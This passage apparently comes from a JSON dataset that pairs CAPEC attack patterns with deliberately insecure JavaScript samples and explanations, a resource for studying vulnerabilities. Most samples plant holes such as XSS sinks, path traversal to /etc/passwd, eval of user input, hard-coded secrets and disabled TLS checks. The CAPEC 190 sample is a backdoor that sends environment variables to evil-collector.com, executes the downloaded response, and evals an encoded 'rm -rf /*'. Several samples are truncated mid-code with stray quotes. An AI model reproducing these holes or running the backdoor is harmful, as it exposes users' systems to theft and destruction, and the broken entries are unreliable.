        "code_snippet": "class SecureDevice {\n    constructor() {\n        this.secretKey = 'mysecretkey123';\n        this.deviceId = '12345';\n        this._debugMode = false;\n    }\n\n    encrypt(data) {\n        // Weak custom encryption\n        return data.split('').map(char => \n            String.fromCharCode(char.charCodeAt(0) + this.secretKey.length)\n        ).join('');\n    }\n\n    // Undocumented debug feature\n    enableDebugMode() {\n        this._debugMode = true;\n        return {\n            secretKey: this.secretKey,\n            deviceId: this.deviceId,\n            systemInfo: process.env,\n            hardwareConfig: this.getHardwareConfig()\n        };\n    }\n\n    getHardwareConfig() {\n        return {\n            processor: 'ARM64',\n            memory: '4GB',\n            securityModules: ['TPM', 'SecureEnclave'],\n            internalStructure: this.getDetailedInternalLayout()\n        };\n    }\n\n    getDetailedInternalLayout() {\n        return 'Detailed circuit layout and memory mapping...';\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to reverse engineering protection. It includes a weak custom encryption implementation, exposes sensitive system information through an undocumented debug feature, and contains detailed hardware configuration information that could aid in physical reverse engineering. The code also demonstrates poor protection of internal system details and uses risky cryptographic methods."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "function comparePassword(userInput, storedHash) {\n  let match = true;\n  for(let i = 0; i < storedHash.length; i++) {\n    if(userInput[i] !== storedHash[i]) {\n      match = false;\n      // Timing side-channel: early return reveals length\n      // and position of mismatch through execution time\n      return false;\n    }\n    // Artificial delay creates observable timing difference\n    setTimeout(() => {}, 100);\n  }\n  return match;\n}\n\nfunction processUserData(input) {\n  try {\n    // Detailed error messages reveal system info\n    if(!input.match(/^[a-zA-Z0-9]+$/)) {\n      throw new Error('Invalid input: System using regex validation at ' + \n                    process.version + ' on ' + process.platform);\n    }\n    return JSON.parse(input);\n  } catch(e) {\n    console.error(e.message);\n    return null;\n  }\n}",
        "description": "This code contains multiple vulnerabilities that enable black box analysis through observable behaviors. It includes a timing side-channel in password comparison, revealing information through execution time differences. The error handling exposes sensitive system information. Both functions allow an attacker to gather information about the system's behavior through external observation of responses and timing patterns."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "function secretBackdoor() {\n    const hiddenCmd = atob('cm0gLXJmIC8qIHx8IGVjaG8gJ2hhY2tlZCc=');\n    const debugData = {\n        sysInfo: process.env,\n        platform: process.platform,\n        arch: process.arch,\n        pid: process.pid\n    };\n    \n    // Hidden functionality triggered by special condition\n    if (process.argv.includes('--debug-391')) {\n        const http = require('http');\n        const options = {\n            hostname: 'evil-collector.com',\n            path: '/collect',\n            method: 'POST'\n        };\n        \n        const req = http.request(options, (res) => {\n            eval(res.toString()); // Execute downloaded code without verification\n        });\n        \n        req.write(JSON.stringify(debugData));\n        req.end();\n        \n        return eval(hiddenCmd);\n    }\n}",
        "description": "This code demonstrates hidden malicious functionality that collects sensitive system information and contains a backdoor that can be triggered via a specific command-line argument. It includes undocumented features, exposure of system information, improper handling of sensitive data, and execution of unverified downloaded code."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "\"const ADMIN_PASSWORD = 'admin123';\nconst API_KEY = '1a2b3c4d5e6f7890';\nconst ENCRYPTION_KEY = 'mysecretkey123';\nconst DATABASE_URL = 'mongodb://admin:password@localhost:27017/prod';\n\nclass AuthenticationManager {\n  constructor() {\n    this.secretToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9';",
        "description": "\"This code contains multiple hard-coded sensitive constants including passwords, API keys, encryption keys, and database credentials directly in the source code. These values are stored in cleartext and easily discoverable through basic code analysis. The AuthenticationManager class uses these constants for authentication, API access, encryption, and database connections, making them vulnerable to extraction and misuse.\""
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "`\n    function establishSecureConnection(clientData) {\n      // Weak encryption key and static IV\n      const key = '1234567890123456';\n      const iv = '1111111111111111';\n      \n      // Negotiating encryption algorithm with client, accepting weak algorithms\n      let encryptionAlgorithm = clientData.preferredAlgorithm || 'DES';\n      \n      // Transmitting sensitive data with weak encryption\n      function encryptData(data) {\n        if (encryptionAlgorithm === 'none') {\n          return Buffer.from(data).toString('base64');",
        "description": "\"This vulnerable code demonstrates weak protocol security through multiple issues: using inadequate encryption strength with a static key and IV, allowing algorithm downgrade during negotiation, potential cleartext transmission if 'none' is selected as the algorithm, making assumptions about memory layout for security identifiers, and incorrect conversion of security identifiers from buffer data. The code transmits sensitive information like credentials and credit card data using these insecure methods.\""
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const url = new URL(req.query.module, 'http://localhost');\nconst remoteCode = await fetch(url);\nconst moduleContent = await remoteCode.text();\neval(moduleContent); // Dynamically execute remote code\n\napp.get('/load-module', (req, res) => {\n  const moduleUrl = req.query.module;\n  require(moduleUrl); // Unsafe dynamic require\n});",
        "description": "This code demonstrates unsafe remote code inclusion by allowing arbitrary URLs to be passed as module paths, which are then fetched and executed using eval() or require(). The code doesn't validate the source or content of the remote files, allowing an attacker to inject and execute malicious code from external sources."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/authenticate', (req, res) => {\n    // Vulnerable authentication implementation\n    const userId = req.headers['user-id'];\n    const token = req.headers['auth-token'];\n    \n    // No proper validation of token or source verification\n    if (userId && token) {\n        let userSession = {\n            id: userId,\n            isAdmin: req.headers['is-admin'] === 'true',  // Dangerous: trusting client-provided admin status\n            timestamp: Date.now()\n        };\n        \n        // Store session without proper validation\n        sessions[userId] = userSession;\n        \n        res.json({ status: 'authenticated', rights: userSession });\n    } else {\n        res.status(401).json({ error: 'Authentication failed' });\n    }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates vulnerable authentication where user identity and privileges can be easily spoofed. The server blindly trusts client-provided headers without proper verification, allowing attackers to forge identities and escalate privileges by manipulating request headers. There's no proper token validation or source verification, making it susceptible to impersonation attacks."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "// User authentication system with vulnerable principal checks\nconst authenticateUser = (requestData) => {\n    // Trust sender-specified identity without verification\n    const { username, origin } = requestData;\n    \n    // Vulnerable: No verification of message origin\n    const trustedDomains = ['admin.example.com', 'secure.example.com'];\n    \n    // Unsafe check that can be spoofed\n    if (trustedDomains.includes(origin)) {\n        // Vulnerable: Automatically grant admin access based on unverified origin\n        if (origin === 'admin.example.com') {\n            return {\n                authenticated: true,\n                role: 'admin',\n                username: username\n            };\n        }\n        return {\n            authenticated: true,\n            role: 'user',\n            username: username\n        };\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that trusts sender-provided identity information without proper verification. It relies solely on an unverified 'origin' field to determine user authenticity and privileges, making it susceptible to principal spoofing attacks. The code fails to implement proper authentication mechanisms and blindly trusts the provided origin, allowing attackers to impersonate legitimate users by spoofing the origin field."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "function createUserSession(username) {\n    // Weak session generation using predictable pattern\n    let sessionId = btoa(username + '_' + new Date().getTime());\n    \n    // No validation of existing sessions\n    // No secure transport handling\n    // No proper session expiration\n    const session = {\n        id: sessionId,\n        username: username,\n        created: new Date().getTime(),\n        isValid: true\n    };\n    \n    // Store session without encryption\n    activeSessions[sessionId] = session;\n    \n    // Return session ID without secure transport\n    return sessionId;\n}\n\nfunction validateSession(sessionId) {\n    // No checks for session tampering\n    // No expiration verification\n    if (activeSessions[sessionId]) {\n        return activeSessions[sessionId].isValid;\n    }\n    return false;\n}",
        "description": "This code demonstrates vulnerable session management by using weak session generation, lacking session validation, missing secure transport, and having insufficient session expiration mechanisms. The session ID is created using a predictable pattern and transmitted insecurely, making it susceptible to forgery attacks."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function processNestedTemplate(template) {\n  let result = template;\n  while (result.includes('${')) {\n    result = result.replace(/\\${([^}]+)}/g, (match, p1) => {\n      return p1.repeat(2);\n    });\n  }\n  return result;\n}\n\nfunction handleUserInput(input) {\n  const maliciousTemplate = '${${${${${hello}}}}}';\n  const expandedResult = processNestedTemplate(maliciousTemplate);\n  let storage = [];\n  for(let i = 0; i < expandedResult.length; i++) {\n    storage.push(new Array(expandedResult.length).fill(expandedResult));\n  }\n  return storage;\n}",
        "description": "This code demonstrates a vulnerability where nested template expansion can lead to exponential resource consumption. The processNestedTemplate function recursively expands nested templates without limits, and handleUserInput compounds the issue by creating large nested arrays based on the expanded result. This can cause memory exhaustion and CPU overload with relatively small input, especially when processing deeply nested templates."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "function displayErrorPage(userInput) {\n    let errorMessage = 'An error occurred while processing: ' + userInput;\n    let errorPage = `\n        <html>\n        <head><title>Error Page</title></head>\n        <body>\n            <div class='error-container'>\n                <img src='${userInput}' onerror='alert(1)'/>\n                <h1>Error Details</h1>\n                ${errorMessage}\n            </div>\n        </body>\n        </html>\n    `;\n    document.write(errorPage);\n}",
        "description": "This code creates an error page that directly inserts unvalidated user input into both an image tag source attribute and error message content. It allows XSS attacks through malformed URLs and script injection in error messages, demonstrating lack of input sanitization in error handling."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "function validateUserInput(input) {\n  const blacklist = ['script', 'alert', 'onerror'];\n  let sanitizedInput = input;\n  \n  // Basic attempt to filter malicious tags\n  blacklist.forEach(word => {\n    sanitizedInput = sanitizedInput.replace(word, '');\n  });\n  \n  // Directly insert potentially dangerous input into DOM\n  document.getElementById('content').innerHTML = sanitizedInput;\n}",
        "description": "This vulnerable code attempts to sanitize user input using a basic blacklist approach but fails to account for case variations and alternate syntax forms of malicious tags. An attacker could bypass the filter using variations like 'ScRiPt', 'SCRIPT', or encoded versions of these tags. The code also directly inserts the inadequately sanitized input into innerHTML, enabling XSS attacks."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "function processUserInput(input) {\n    // Disabled input validation for performance\n    // let inputFilter = /[<>'\"/;]/g;\n    \n    // Raw input directly passed to database query\n    let query = `SELECT * FROM users WHERE username = '${input}'`;\n    \n    // Direct eval of user input without sanitization\n    eval('var userValue = ' + input);\n    \n    // Disabled size checks\n    // if (input.length > MAX_LENGTH) return false;\n    \n    // Execute query and process input without any validation\n    return executeQuery(query);\n}",
        "description": "This code demonstrates vulnerable input handling by deliberately disabling or removing input validation mechanisms. It includes commented-out security checks that would normally filter special characters, validate input length, and prevent injection attacks. The code directly processes raw user input in database queries and eval() statements without any sanitization, making it susceptible to SQL injection and code injection attacks."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const yaml = require('js-yaml');\nconst fs = require('fs');\n\nfunction processUserConfig(configPath) {\n    try {\n        const userConfig = yaml.load(fs.readFileSync(configPath, 'utf8'), {\n            schema: yaml.DEFAULT_SCHEMA\n        });\n        \n        if (userConfig.externalResource) {\n            const externalData = fs.readFileSync(userConfig.externalResource);\n            const sensitiveData = {\n                username: 'admin',\n                password: 'secret123',\n                apiKey: 'abcd1234'\n            };\n            \n            const finalConfig = {\n                ...userConfig,\n                ...JSON.parse(externalData),\n                sensitiveData\n            };\n            \n            return finalConfig;\n        }\n    } catch (error) {\n        console.error('Error processing config:', error);\n    }\n}",
        "description": "This code demonstrates vulnerable deserialization by loading untrusted YAML configuration files that can contain external references. It combines sensitive data with unsanitized external data sources, allows arbitrary file system access through external references, and performs unsafe deserialization of JSON data from external sources. The code does not validate external references or implement proper access controls."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "// Malicious client implementation\nclass ModifiedClient {\n    constructor() {\n        this.serverEndpoint = 'https://api.example.com';\n    }\n\n    async login(username, password) {\n        // Bypass authentication by setting authenticated=true locally\n        localStorage.setItem('authenticated', 'true');\n        return true;\n    }\n\n    async fetchProtectedData() {\n        // Skip expected client-side checks\n        const response = await fetch(`${this.serverEndpoint}/protected`, {\n            headers: {\n                'X-Client-Version': '2.0',  // Spoofed client version\n                'X-Authentication': 'bypass' // Invalid auth token\n            }\n        });\n        return response.json();\n    }\n\n    validateBusinessRules(data) {\n        // Bypass client-side validation rules\n        return true;\n    }\n\n    submitTransaction(data) {\n        // Create unexpected resource consumption\n        const payload = new Array(1000000).fill(data);\n        return fetch(`${this.serverEndpoint}/submit`, {\n            method: 'POST',\n            body: JSON.stringify(payload)\n        });\n    }\n}",
        "description": "A malicious client implementation that bypasses expected client-side security controls, authentication mechanisms, and business rule validations. It also includes functionality to create resource exhaustion through unexpected payload sizes. The code exploits server-side assumptions about client behavior and demonstrates how client-side security controls can be circumvented."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const Registry = {\n  settings: {},\n  init() {\n    this.settings = {\n      adminToken: 'admin123',\n      userRoles: ['user', 'admin'],\n      apiKey: 'sk_live_abcd1234',\n      isLocked: false\n    };\n  },\n  modifyRegistry(key, value, token) {\n    // Vulnerable: No proper authorization check\n    if (token) {\n      // Vulnerable: No integrity check on modifications\n      this.settings[key] = value;\n      return true;\n    }\n    return false;\n  },\n  getRegistryValue(key) {\n    // Vulnerable: Cleartext storage and no access control\n    return this.settings[key];\n  },\n  lockRegistry() {\n    // Vulnerable: Lock bit can be modified later\n    this.settings.isLocked = true;\n  }\n};\n\n// Attacker can modify registry values\nRegistry.init();\nRegistry.modifyRegistry('adminToken', 'hacked', 'fake_token');\nRegistry.modifyRegistry('isLocked', false, 'fake_token');",
        "description": "This code demonstrates a vulnerable registry implementation that allows unauthorized modification of configuration settings. It exhibits multiple vulnerabilities including cleartext storage of sensitive data, weak authorization controls, lack of integrity checking, and modifiable lock bits. The registry can be manipulated to change security-critical values like admin tokens and access controls."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "function userLoginHandler() {\n    const username = document.getElementById('username').value;\n    const password = document.getElementById('password').value;\n    \n    // Store sensitive data in browser's localStorage\n    localStorage.setItem('credentials', JSON.stringify({\n        user: username,\n        pass: password,\n        lastLogin: new Date().toISOString(),\n        sessionToken: generateToken()\n    }));\n    \n    // Cache API storing sensitive data without encryption\n    caches.open('userCache').then(cache => {\n        cache.put('/api/user-profile', new Response(JSON.stringify({\n            creditCardNumber: '4532-xxxx-xxxx-1234',\n            ssn: '123-45-6789',\n            address: '123 Main St'\n        })));\n    });\n\n    // No cache control headers set\n    fetch('/api/sensitive-data', {\n        method: 'POST',\n        body: JSON.stringify({ username, password })\n    });\n}",
        "description": "This vulnerable code stores sensitive user information including credentials, credit card data, and personal information in both localStorage and browser cache without encryption. It also makes API requests without proper cache control headers, allowing sensitive data to be cached by the browser. The code violates secure coding practices by failing to protect cached data and not implementing proper cache controls."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "// Client-side authentication implementation\nclass UserAuth {\n    constructor() {\n        this.credentials = {\n            username: 'admin',\n            password: 'secretpass123'\n        };\n    }\n\n    authenticate(user, pass) {\n        // Store credentials in localStorage for 'remember me' feature\n        localStorage.setItem('auth_token', btoa(user + ':' + pass));\n        \n        // Client-side only authentication\n        if(user === this.credentials.username && \n           pass === this.credentials.password) {\n            return true;\n        }\n        return false;\n    }\n\n    makeAuthenticatedRequest() {\n        let token = localStorage.getItem('auth_token');\n        fetch('https://api.example.com/data', {\n            headers: {\n                'Authorization': 'Basic ' + token\n            }\n        });\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication issues including client-side only authentication, storing sensitive credentials in localStorage, and sending credentials in base64 encoding without proper encryption. The authentication can be easily bypassed by modifying the client-side code or intercepting/replaying the stored credentials."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\nclass CodeSigner {\n    constructor() {\n        // Hard-coded private key and credentials (CWE-798)\n        this.privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkq...'\n        this.signingCert = '-----BEGIN CERTIFICATE-----\\nMIIDXTCCAkWgAwIB...'\n    }\n\n    signCode(codePath) {\n        // No verification of code origin (CWE-494)\n        let code = fs.readFileSync(codePath);\n        \n        // Incorrect permission check (CWE-732)\n        fs.chmodSync(codePath, '0777');\n\n        const sign = crypto.createSign('SHA256');\n        sign.update(code);\n        const signature = sign.sign(this.privateKey, 'base64');\n\n        // Client-side only verification (CWE-603)\n        fs.writeFileSync(codePath + '.sig', signature);\n        return signature;\n    }\n\n    downloadAndSignCode(url) {\n        // Downloads and signs code without proper verification\n        const http = require('http');\n        http.get(url, (res) => {\n            let code = '';\n            res.on('data', (chunk) => { code += chunk; });\n            res.on('end', () => {\n                fs.writeFileSync('downloaded.js', code);\n                this.signCode('downloaded.js');\n            });\n        });\n    }\n}",
        "description": "This code demonstrates a vulnerable code signing implementation that includes hard-coded credentials, improper permission management, and lack of code integrity verification. It allows unauthorized signing of potentially malicious code using embedded private keys and certificates."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "// Client-side JavaScript\nconst validateOrder = (orderData) => {\n  if (window.runSecurityChecks) {\n    const total = calculateTotal(orderData.items);\n    if (total > 1000) {\n      return false; // Block large orders\n    }\n    if (!validateUserPermissions()) {\n      return false;\n    }\n  }\n  \n  // Send order to server\n  fetch('/api/submit-order', {\n    method: 'POST',\n    body: JSON.stringify(orderData),\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  });\n  return true;\n}",
        "description": "This vulnerable code performs critical security checks only on the client side through a global window.runSecurityChecks flag. An attacker can bypass these checks by either modifying the client-side code to skip validation, setting runSecurityChecks to false, or directly sending requests to the server endpoint. The server blindly trusts that these checks were performed client-side without implementing its own validation."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "// Client-side shopping cart calculation\nlet cart = {\n  items: [],\n  calculateTotal: function() {\n    let total = 0;\n    this.items.forEach(item => {\n      total += item.price * item.quantity;\n    });\n    return total;\n  }\n};\n\n// Server endpoint for order processing\nfunction submitOrder() {\n  let orderData = {\n    items: cart.items,\n    total: cart.calculateTotal(),\n    userId: document.cookie.split('userId=')[1]\n  };\n\n  // Send order to server without validation\n  fetch('/api/process-order', {\n    method: 'POST',\n    body: JSON.stringify(orderData),\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  });\n}",
        "description": "This vulnerable code relies on client-side calculation of order totals without server-side validation. The total price calculation is performed entirely in the browser and sent to the server, which blindly trusts the received values. Additionally, it uses an unvalidated cookie for user identification. An attacker could modify the client-side JavaScript to alter prices or manipulate the calculation function to send fraudulent totals to the server."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fileUpload = require('express-fileupload');\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n    const uploadedFile = req.files.file;\n    const fileName = uploadedFile.name;\n    \n    // Vulnerable: only checks file extension, not actual content\n    if (fileName.endsWith('.txt')) {\n        uploadedFile.mv('./uploads/' + fileName);\n        \n        // Vulnerable: serves file without proper Content-Type validation\n        res.sendFile('./uploads/' + fileName, {\n            headers: {\n                'Content-Type': 'text/plain'\n            }\n        });\n    }\n});\n\napp.get('/display', (req, res) => {\n    // Vulnerable: directly inserting user input into HTML\n    const fileUrl = req.query.file;\n    res.send(`<img src=\"${fileUrl}\" onerror=\"alert(1)\">`);\n});\n\napp.listen(3000);",
        "description": "This code contains multiple vulnerabilities related to MIME type confusion and XSS. It allows file uploads without proper content validation, only checking file extensions. The server sends files with a hardcoded Content-Type, allowing MIME type confusion attacks. Additionally, it includes an XSS vulnerability by directly embedding user input into an img tag without sanitization."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "function sanitizeUserInput(input) {\n  // Incomplete denylist-based XSS protection\n  const blacklist = ['<script>', 'javascript:', 'onerror='];\n  let sanitized = input;\n  \n  blacklist.forEach(term => {\n    sanitized = sanitized.replace(term, '');\n  });\n  \n  // Unsafe rendering of user input in HTML\n  const userContent = document.createElement('div');\n  userContent.innerHTML = sanitized;\n  \n  // Unsafe IMG tag handling\n  const userImage = `<img src=\"${sanitized}\" onerror=\"alert('XSS')\">`;\n  document.body.innerHTML += userImage;\n  \n  return userContent;\n}",
        "description": "A vulnerable implementation that attempts to sanitize user input using an incomplete denylist approach, allowing various XSS attack vectors through IMG tag attributes and inadequate input sanitization. The code fails to properly neutralize user-controllable input before rendering it in the web page."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "`\n// Hidden debug functionality that can be exploited\nclass SystemManager {\n  constructor() {\n    this._debugMode = false;\n    this._systemInfo = {\n      kernelVersion: '5.4.0',\n      users: [\n        { username: 'admin', password: 'hash1234'",
        "description": "\"This code contains several vulnerable features including an undocumented debug mode that exposes sensitive system information, direct memory access functionality, and a system status function that can be abused through rapid calling to cause resource exhaustion. The code demonstrates legitimate functionality that can be misused for malicious purposes, including exposure of sensitive data and potential system instability through improper use of low-level features.\""
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readUserFile(userInput) {\n    const basePath = '/var/www/userfiles/';\n    const filePath = basePath + userInput;\n    \n    // Vulnerable: No path traversal checks\n    return fs.readFileSync(filePath, 'utf8');\n}\n\n// Example usage that could be exploited\nconst userData = readUserFile('../../etc/passwd');",
        "description": "This code demonstrates a vulnerable file access function that allows path traversal by directly concatenating user input with a base path without proper validation. An attacker can use '../' sequences to traverse outside the intended directory and access sensitive files on the system."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const app = require('express')();\n\napp.use((err, req, res, next) => {\n  console.log('Debug:', err.stack);\n  res.status(500).send({\n    error: err.message,\n    stack: err.stack,\n    details: process.env,\n    serverInfo: process.version\n  });\n});\n\napp.get('/test', (req, res) => {\n  eval(req.query.input);\n  const socket = new require('net').Socket();\n  socket.connect(req.query.port, req.query.host);\n});",
        "description": "This vulnerable code demonstrates multiple security issues including verbose error handling exposing sensitive information, direct socket usage in a web application, dynamic code execution through eval(), and debug logging of sensitive data. The code lacks proper input validation and error handling, making it susceptible to information disclosure and remote code execution attacks."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/user/:id', (req, res) => {\n    try {\n        const userId = req.params.id;\n        const dbConnection = 'mysql://admin:secretpass@localhost:3306/users';\n        const query = `SELECT * FROM users WHERE id = ${userId}`;\n        \n        fs.appendFileSync('app.log', `[${new Date()}] Executing query: ${query} with connection ${dbConnection}\\n`);\n        \n        throw new Error(`Database error: Unable to connect to ${dbConnection} while executing ${query}`);\n    } catch (error) {\n        console.error(`Full stack trace: ${error.stack}`);\n        res.status(500).send({\n            error: error.message,\n            timestamp: new Date(),\n            request_id: req.params.id,\n            server: process.env.HOSTNAME,\n            database_config: process.env.DB_CONFIG\n        });\n    }\n});",
        "description": "This code demonstrates multiple security vulnerabilities related to sensitive information exposure through error messages and logging. It logs database connection strings with credentials, writes sensitive SQL queries to log files, and returns detailed error messages containing system information to users. The error handler exposes internal system details including stack traces, server hostnames, and database configurations."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "// Server-side WebSocket setup\nconst WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', function(ws) {\n    // No authentication check for critical operations\n    ws.on('message', function(message) {\n        let data = JSON.parse(message);\n        \n        // Blindly trust incoming messages without verification\n        if (data.action === 'admin_command') {\n            executeAdminCommand(data.command);\n        }\n        \n        // No message integrity checks\n        if (data.type === 'financial_transaction') {\n            processTransaction(data.amount, data.destination);\n        }\n        \n        // Broadcasting messages to all connected clients\n        // without verifying source or encrypting data\n        wss.clients.forEach(function(client) {\n            client.send(message);\n        });\n    });\n});\n\nfunction executeAdminCommand(cmd) {\n    // Directly execute commands without validation\n    require('child_process').exec(cmd);\n}\n\nfunction processTransaction(amount, dest) {\n    // Process financial data without verifying integrity\n    transferFunds(amount, dest);\n}",
        "description": "This code demonstrates a vulnerable WebSocket server implementation that lacks authentication, message integrity checks, and proper channel verification. It allows unauthenticated access to critical functions, blindly trusts incoming messages, and broadcasts sensitive information to all connected clients. The code also creates potential covert channels through uncontrolled message broadcasting."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst https = require('https');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt'),\n  rejectUnauthorized: false,  // Disables certificate validation\n  secureProtocol: 'TLSv1_method'  // Forces older TLS version\n};\n\napp.post('/api/login', (req, res) => {\n  const credentials = req.body;\n  const token = generateToken(credentials);\n  \n  // Send sensitive data in plain querystring\n  res.redirect(`/dashboard?auth_token=${token}&user_role=admin`);\n});\n\nconst server = https.createServer(options, app);\n\n// Accept any client certificate without validation\nserver.on('secureConnection', (socket) => {\n  socket.authorized = true;\n});\n\nserver.listen(443);",
        "description": "This code demonstrates multiple SSL/TLS vulnerabilities including disabled certificate validation, forced use of older TLS version, improper token transmission, and acceptance of any client certificate. It exposes sensitive data in URLs and lacks proper endpoint verification, making it susceptible to capture-replay attacks and authentication bypass."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "`\n    const UDDIService = {\n      registerBusiness: function(businessInfo, xmlData) {\n        // No validation of XML against schema (CWE-112)\n        // No verification of data authenticity (CWE-345)\n        let businessRegistry = {",
        "description": "\"This vulnerable code implements a UDDI service registration system that processes XML data without proper validation, authentication, or integrity checks. It allows attackers to register spoofed business services by submitting malicious XML data. The code lacks schema validation, source verification, and message integrity verification, making it susceptible to impersonation and data manipulation attacks in e-business transactions.\""
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst axios = require('axios');\nconst xml2js = require('xml2js');\n\napp.post('/process-xml', async (req, res) => {\n  const xmlData = req.body.xml;\n  const routingInfo = {\n    next: req.headers['x-next-node'],\n    intermediary: 'http://internal-processor:8080'\n  };\n\n  try {\n    // No XML validation\n    const parsedXml = await xml2js.parseStringPromise(xmlData);\n    \n    // Process routing information without source verification\n    if (routingInfo.next) {\n      const response = await axios.post(routingInfo.next, xmlData, {\n        headers: {\n          'Content-Type': 'application/xml',\n          'Original-Source': routingInfo.intermediary // Masking true source\n        }\n      });\n      \n      // Forward modified response without validation\n      res.send(response.data);\n    } else {\n      // Direct processing without path verification\n      const xpath = req.query.xpath || '//data';\n      const nodes = parsedXml.evaluate(xpath, parsedXml, null, \n        XPathResult.ANY_TYPE, null);\n      res.send(nodes);\n    }\n  } catch (error) {\n    res.status(500).send(error);\n  }\n});",
        "description": "This vulnerable code demonstrates an XML routing detour attack scenario where an intermediate system processes XML content without proper validation. It includes multiple vulnerabilities: missing XML schema validation, unverified routing information processing, potential XML external entity references, XPath injection via unfiltered user input, and confused deputy issues through improper source tracking in forwarded requests."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  let negotiatedProtocol = '';\n  \n  socket.on('data', (data) => {\n    if (!negotiatedProtocol) {\n      // Vulnerable protocol negotiation - accepts any protocol version\n      negotiatedProtocol = data.toString().trim();\n      socket.write('Protocol accepted: ' + negotiatedProtocol);\n      \n      // No validation of protocol security level\n      if (negotiatedProtocol.includes('v1')) {\n        // Uses weak encryption for backwards compatibility\n        socket.encryption = 'weak';",
        "description": "\"This code demonstrates multiple protocol-related vulnerabilities: it allows protocol downgrade attacks by accepting any protocol version without security checks, lacks replay protection mechanisms, implements weak server-side security by trusting client input, and uses direct socket connections without proper security frameworks. The server accepts connections from any source and processes messages without proper authentication or validation.\""
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "`const fs = require('fs');\nconst xml2js = require('xml2js');\nconst parser = new xml2js.Parser();\n\nfunction processXMLFile(xmlInput) {\n    const xmlData = fs.readFileSync(xmlInput, 'utf8');\n    parser.parseString(xmlData, function (err, result) {\n        if(err) {\n            console.error(err);\n            return;",
        "description": "\"This code demonstrates an XML External Entity (XXE) vulnerability by processing XML input without proper validation or restrictions. It accepts any XML file as input and processes external entities without restriction, potentially allowing an attacker to exploit XXE attacks through maliciously crafted XML files containing external entity references that could lead to file disclosure, denial of service, or server-side request forgery.\""
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
